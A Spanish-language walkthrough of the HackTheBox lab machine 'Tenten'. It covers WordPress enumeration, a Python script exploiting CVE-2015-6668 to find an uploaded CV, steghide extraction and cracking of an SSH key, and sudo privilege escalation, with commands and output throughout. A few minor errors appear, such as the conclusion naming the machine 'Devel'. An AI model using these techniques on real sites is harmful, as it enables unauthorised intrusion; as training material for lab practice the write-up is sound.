---
title: HTB - Tenten
published: true
categories: [Linux]
tags: [eJPT, eWPT, Media]
---


<img src="/assets/HTB/Tenten/tenten.png">


¡Hola!
Vamos a resolver de la máquina `Tenten` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Wordpress Enumeration**
- **CV filename disclosure on Job-Manager Wordpress Plugin [CVE-2015-6668]**
- **Steganography Challenge (Steghide)**
- **Cracking Hashes [Protected SSH Private Key]**
- **Abusing sudoers privilege**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Tenten`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.10
PING 10.10.10.10 (10.10.10.10) 56(84) bytes of data.
64 bytes from 10.10.10.10: icmp_seq=1 ttl=63nma time=42.3 ms

--- 10.10.10.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.10 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```java
nmap -sCV -p21,80 10.10.10.10 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Job Portal &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.7.3
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.10.10

http://10.10.10.10 [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.211.179], RedirectLocation[http://tenten.htb/], Title[301 Moved Permanently]
ERROR Opening: http://tenten.htb/ - no address for tenten.htb
```
Vemos que redirige al dominio `tenten.htb` por lo que procedemos a agregar la info a nuestro `/etc/hosts` y repetetimos escaneo

```ruby
❯ whatweb http://tenten.htb
http://tenten.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.211.179], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Job Portal &8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3]
```
Observamos que el servicio web corre bajo WordPress, vamos a echarle un vistazo...

### Reconocimiento WordPress

* * *

Como en casi todos los WordPress podemos enumerar usuarios válidos viendo quien ha publicado posts. En este caso localizamos al usuario `takis`


<img src="/assets/HTB/Tenten/takis.png">


De momento no tenemos credenciales válidas así que seguimos con el reconocimiento. Accedemos al menú de `Job Listing` y vemos un anuncio de trabajo para Pentester, como es el trabajo de nuestros sueños rápidamente hacemos click en `Apply Now` y accedeemos a un formulario donde rellenar nuestros datos para solicitar el empleo


<img src="/assets/HTB/Tenten/pentester.png">


Nos llama la atención la url. Cambiamos el 8 por un 1 y vemos que podemos acceder a otros registros que en un principio no podíamos ver


<img src="/assets/HTB/Tenten/helloworld.png">


Vamos a crear un pequeño script en el que vamos a poder lisar todas las posibles entradas

```bash
❯ for i in {1..20};do echo "[+] Para el número $i: $(curl -s -X GET "http://tenten.htb/index.php/jobs/apply/$i/" | html2text | grep "Job Application" | awk '{print $2}' FS=":")";done
[+] Para el número 1:  Hello world! ******
[+] Para el número 2:  Sample Page ******
[+] Para el número 3:  Auto Draft ******
[+] Para el número 4: 
[+] Para el número 5:  Jobs Listing ******
[+] Para el número 6:  Job Application ******
[+] Para el número 7:  Register ******
[+] Para el número 8:  Pen Tester ******
[+] Para el número 9:  ******
[+] Para el número 10:  Application ******
[+] Para el número 11:  cube ******
[+] Para el número 12:  Application ******
[+] Para el número 13:  HackerAccessGranted ******
[+] Para el número 14: 
[+] Para el número 15: 
[+] Para el número 16: 
[+] Para el número 17: 
[+] Para el número 18: 
[+] Para el número 19: 
[+] Para el número 20: 
```

Vamos a proceder a enumerar posibles plugins de WordPress. Para ello vamos a fuzzear con el diccionario de `wp-plugins.fuzz.txt` que se encuentra dentro del repo de `SecLists`

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  http://tenten.htb/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://tenten.htb/FUZZ
Total requests: 13368

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000468:   200        0 L      0 W        0 Ch        "wp-content/plugins/akismet/"                                                                                             
000004593:   500        0 L      0 W        0 Ch        "wp-content/plugins/hello.php/"                                                                                           
000004592:   500        0 L      0 W        0 Ch        "wp-content/plugins/hello.php"                                                                                            
000005242:   403        11 L     32 W       316 Ch      "wp-content/plugins/job-manager/"                                                                                         
```

### Explotación

* * *

Procedemos a buscar vulnerabilidades del plugin `job-manager` y encontramos un sitio donde vemos que podemos enumerar los posibles CV's subidos a WordPress. Tenemos un enlace a una página que no existe pero mediante la web `WayBack Machine` encontramos una snapshot que podemos ver y extraemos el siguiente script en Python2 el cual vamos a adaptar a Python3

```python
#!/usr/bin/python3

import requests

print ("""  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
""") 
website = input('Enter a vulnerable website: ')  
filename = input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2022):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx','jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print ("[+] URL of CV found! " + URL)
```

Ejecutamos el script y nos pide `url` y `file name` y aquí es donde entra en juego la enumeración que realizamos anteriormente en donde localizamos la entrada `HackerAccessGranted`

```bash
❯ python3 exploit.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://tenten.htb
Enter a file name: HackerAccessGranted 
[+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

Nos descargamos la imagen proporcionada en los resultados del script y procedemos mediante la herramienta `steghide` a enumerar posibles archivos escondidos en la imagen

```bash
❯ steghide info HackerAccessGranted.jpg
"HackerAccessGranted.jpg":
  formato: jpeg
  capacidad: 15,2 KB
Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "id_rsa":
    tamao: 1,7 KB
    encriptado: rijndael-128, cbc
    compactado: si
```

Encontramos un archiv `id_rsa` con una clave privada en la imagen. Procedemos a extraer el archivo

```bash
❯ steghide extract -sf HackerAccessGranted.jpg
Anotar salvoconducto: 
anot los datos extrados e/"id_rsa".
❯ ls
 HackerAccessGranted.jpg   id_rsa
```

Vemos en el contenido del archivo `id_rsa` que está protegido con contraseña. Con la herramienta `ssh2john.py` extraemos el hash para seguidamente con `john` y el diccionario rockyou.txt conseguimos la contraseña del archivo id_rsa

```bash
❯ python2 /usr/share/john/ssh2john.py id_rsa > hash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
************d    (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2022-11-06 17:32) 0.2506g/s 3594Kp/s 3594Kc/s 3594KC/sa6_123..*7¡Vamos!
Session completed

```

Una vez obtenida la password nos podemos conectar mediante `ssh` con el usuario `takis`

```bash
❯ ssh -i id_rsa takis@10.10.10.10
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

takis@tenten:~$ 

```

Accedemos a la flag y leemos su contenido con cat

```bash
takis@tenten:~$ cat user.txt 
9df4680d7b9ce6ac1***************
```

### Escalada Privilegios

* * *

Listando posibles archivos que podamos ejecutar con privilegio de root vemos un script `/bin/fuckin`

```bash
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

Observamos su contenido y al ejecutarlo te pide que le pases 4 argumentos los cuales ejecutará. Probamos...

```bash
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
takis@tenten:~$ /bin/fuckin whoami
takis
```
Como lo podemos ejecutar como root directamente tratamos de lanzar una bash con privilegios de root

```bash
takis@tenten:~$ sudo /bin/fuckin bash
root@tenten:~# whoami
root
```

Ya sólo nos queda leer la flag de root

```bash
root@tenten:~# cd /root
root@tenten:/root# ls
root.txt
root@tenten:/root# cat root.txt 
9d350f5c396850014***************
```

Hemos completado la máquina **Devel** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Tenten/pwned.png">
